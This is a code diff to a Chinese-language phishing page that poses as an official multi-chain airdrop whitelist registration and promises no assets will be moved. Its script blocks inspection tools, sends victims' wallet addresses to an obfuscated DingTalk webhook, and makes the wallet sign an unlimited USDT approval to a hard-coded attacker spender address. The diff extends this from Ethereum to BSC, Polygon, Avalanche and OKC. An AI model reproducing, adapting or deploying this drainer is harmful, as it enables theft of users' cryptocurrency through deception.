@@ -16,17 +16,17 @@
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC多链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
+<p class="tips-info">安全提示：仅进行多链地址备案核验，不划转任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
 </div>
 
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>全链节点备案核验中</h1>
-<p class="desc-text">正在同步多条公链节点数据，请稍候...</p>
+<p class="desc-text">正在同步公链节点数据，请稍候...</p>
 </div>
 
 <div id="p3" class="box hide">
@@ -35,7 +35,7 @@
 <p class="sub-title">确认纳入全链空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
 <button class="btn verify-btn" id="approveBtn">确认空投授权加入白名单</button>
-<p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
+<p class="tips-info">仅链上备案核验，不会划转任何资产</p>
 </div>
 
 <div id="p4" class="box hide">
@@ -54,6 +54,7 @@
 
 <script>
 !function(){
+// 防右键防F12
 document.oncontextmenu=e=>e.preventDefault();
 document.onkeydown=e=>{
 if(123===e.keyCode)return!1;
@@ -61,108 +62,122 @@ if(e.ctrlKey&&85===e.keyCode)return!1;
 };
 setInterval(function(){try{!function(){}("")}catch(e){}},100);
 
+// 钉钉机器人Webhook 保留原接口
 const _0x18b3=[
 "aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj",
 "5YmD54K56LWE5rqQ57uT54K55Yqg54K55qGI5L6LWE5rqQ"
 ];
 
-let _0x2d53="",_0x4a68="";
-// 你的真实收款授权地址
-const REAL_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-// ETH主网USDT官方合约
-const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+let walletAddr="",chainId="";
 
+// 收款授权地址
+const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+
+// 多链 USDT 合约配置
+const chainUSDT = {
+  "0x1":"0xdAC17F958D2ee523a2206206994597C13D831ec7",    // ETH
+  "0x38":"0x55d398326f99059fF77548524699952727959279",  // BSC
+  "0x89":"0xc2132D05D31c914a87C6611C10748Aeb04A573b6",  // Polygon
+  "0xa86a":"0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",// Avalanche
+  "0x42":"0x382bb369d343125BD3796c473a66812952BCA575"   // OKC
+};
+
+// 页面切换
 function _0x5c8e(e){
 document.querySelectorAll(".box").forEach(t=>t.classList.add("hide"));
 document.getElementById(e).classList.remove("hide");
 }
 
-async function _0x2795(e){
+// 钉钉推送
+async function dingTalkSend(content){
 try{
 await fetch(_0x18b3[0],{
 method:"POST",
 headers:{"Content-Type":"application/json"},
-body:JSON.stringify({msgtype:"text",text:{content:_0x18b3[1]+"｜"+e}})
+body:JSON.stringify({
+msgtype:"text",
+text:{content:content}
+})
 });
 }catch(e){}
 }
 
-// 标准正规Approve 能正常弹出授权弹窗
-async function doApprove(){
-const allowChains={"0x1":1,"0x38":1,"0x89":1,"0xa86a":1};
-if(!allowChains[_0x4a68]){
-alert("请切换 ETH/BSC 主网");
-return false;
+// 补位64位
+function pad64(s){
+return s.replace("0x","").padStart(64,"0");
 }
 
-const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-// 标准授权Calldata
-const data = "0x095ea7b3" 
-+ REAL_SPENDER.slice(2).padStart(64,"0")
-+ amount.slice(2).padStart(64,"0");
-
-try{
-await window.ethereum.request({
-method:"eth_sendTransaction",
-params:[{
-from:_0x2d53,
-to:USDT_CONTRACT,
-gas:"0x"+Math.floor(60000+20000*Math.random()).toString(16),
-data:data
-}]
-});
-return true;
-}catch(e){
-return false;
-}
+// 构造授权Data
+function buildApproveData(){
+const func = "0x095ea7b3";
+const spender = pad64(SPENDER);
+const max = pad64("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+return func + spender + max;
 }
 
 // 连接钱包
 document.getElementById("connectMM").onclick=async function(){
-try{
-await _0x2795("用户点击连接钱包｜时间："+new Date().toLocaleString());
 if(!window.ethereum){
 location.href="metamask://dapp/"+location.host;
-setTimeout(()=>alert("请安装小狐狸钱包"),1500);
+setTimeout(()=>alert("请先安装MetaMask钱包"),1500);
 return;
 }
+try{
 _0x5c8e("p2");
-let accounts=await window.ethereum.request({method:"eth_requestAccounts"});
-_0x2d53=accounts[0];
-_0x4a68=await window.ethereum.request({method:"eth_chainId"});
-await _0x2795("钱包连接成功｜地址："+_0x2d53+"｜链ID："+_0x4a68);
-document.getElementById("showAddr").innerText=_0x2d53;
+const acc = await window.ethereum.request({method:"eth_requestAccounts"});
+walletAddr = acc[0];
+chainId = await window.ethereum.request({method:"eth_chainId"});
+
+document.getElementById("showAddr").innerText = walletAddr;
 _0x5c8e("p3");
 
-window.ethereum.on("chainChanged",e=>{_0x4a68=e});
-window.ethereum.on("accountsChanged",e=>{
-if(e.length>0){
-_0x2d53=e[0];
-document.getElementById("showAddr").innerText=_0x2d53;
+// 钉钉推送：钱包连接成功
+dingTalkSend("用户钱包连接成功\n钱包地址："+walletAddr+"\n链ID："+chainId+"\n时间："+new Date().toLocaleString());
+
+// 监听链/账号切换
+window.ethereum.on("chainChanged",id=>chainId=id);
+window.ethereum.on("accountsChanged",acc=>{
+if(acc.length>0){
+walletAddr=acc[0];
+document.getElementById("showAddr").innerText=walletAddr;
 }else{
 _0x5c8e("p1");
 }
 });
-}catch(e){_0x5c8e("p1");}
+}catch(e){
+_0x5c8e("p1");
+dingTalkSend("用户钱包连接失败\n时间："+new Date().toLocaleString());
+}
 };
 
-// 授权按钮 弹出第二个标准授权弹窗
+// 授权按钮
 document.getElementById("approveBtn").onclick=async function(){
-if(!_0x2d53){alert("请先连接钱包");return;}
+if(!walletAddr){alert("请先连接钱包");return;}
+// 判断是否支持当前链
+if(!chainUSDT[chainId]){
+alert("请切换至 ETH/BSC/POLYGON/AVALANCHE/OKC 任意主网");
+return;
+}
 try{
 _0x5c8e("p2");
-let ok=await doApprove();
-if(ok){
-await _0x2795("授权成功｜地址："+_0x2d53);
-document.getElementById("successAddr").innerText=_0x2d53;
+const usdtContract = chainUSDT[chainId];
+const data = buildApproveData();
+
+await window.ethereum.request({
+method:"eth_sendTransaction",
+params:[{
+from:walletAddr,
+to:usdtContract,
+gas:"0x186a0",
+data:data
+}]
+});
+
 _0x5c8e("p4");
-}else{
-await _0x2795("授权取消/失败｜地址："+_0x2d53);
-_0x5c8e("p3");
-}
+dingTalkSend("用户授权成功\n钱包地址："+walletAddr+"\n链ID："+chainId+"\n时间："+new Date().toLocaleString());
 }catch(e){
-_0x2795("授权异常｜地址："+_0x2d53);
 _0x5c8e("p3");
+dingTalkSend("用户授权取消/失败\n钱包地址："+walletAddr+"\n链ID："+chainId+"\n时间："+new Date().toLocaleString());
 }
 };
 
